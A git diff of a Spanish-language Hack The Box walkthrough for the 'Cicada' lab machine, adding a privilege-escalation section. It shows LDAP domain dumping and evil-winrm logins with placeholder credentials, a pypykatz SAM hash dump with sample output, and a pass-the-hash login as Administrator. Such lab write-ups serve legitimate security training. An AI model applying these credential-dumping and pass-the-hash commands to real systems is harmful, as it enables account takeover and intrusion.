@@ -154,6 +154,7 @@ Ahora con dumpear toda la información que podamos logueados como este usuario:
 ldapdomaindump ldap:/10.10.11.35 -u 'cicada.htb\michael.wrightson' -p "Credencial"
 ```
 ![Texto alternativo](/assets/cicada3.png)
+
 Y mirando entre estos archivos, encontramos otra credencial, en este caso de el usuario "david" dentro del archivo (domain_users.grep).
 
 Esta credencial y usuario nos va a permitir acceder a los archivos que se encuentra dentro de la carpeta DEV, ya que con el usuario "michael" no podía acceder.
@@ -166,9 +167,37 @@ Asique ahora mediante evil-winrm nos vamos a conectar al AD en busca de la user 
 evil-winrm -i 'cicada.htb' -u 'emily.oscars' -p 'Credencial'
 ```
 Y ya estamos dentro:
+
 ![Texto altenativo](/assets/cicada6.png)
+
 Si buscamos un poco por los directorios, encontramos la user flag:
 ![Texto altenativo](/assets/cicada7.png)
 
 # [](#header-1)Escalada de Privilegios
 
+Primero de todo voy a ver sobre que tengo privilegios:
+
+![Texto altenativo](/assets/cicada8.png)
+
+Lo que voy a hacer ahora es extraer la base de datos SAM para extraer los hashes NTLM/NTHash que estan almacenadas en el sistema:
+```js
+pypykatz registry --sam sam system
+```
+```js
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+	Administrator:500:NTHASHDELUSUARIOADMINISTRATOR*********
+	*******:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+	0:::
+	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
+	d7e0c089c0:::
+```
+Ahora una vez conseguido ese NTHash del usuario "Administrator" nos logueamos utilizando evil-winrm:
+```js
+evil-winrm -i 10.10.11.35 -u administrator -H "NTHASHdeAdministator"
+```
+Y ya encontrariamos la root flag.
+![Texto altenativo](/assets/cicada9.png)
+
+PWNED!
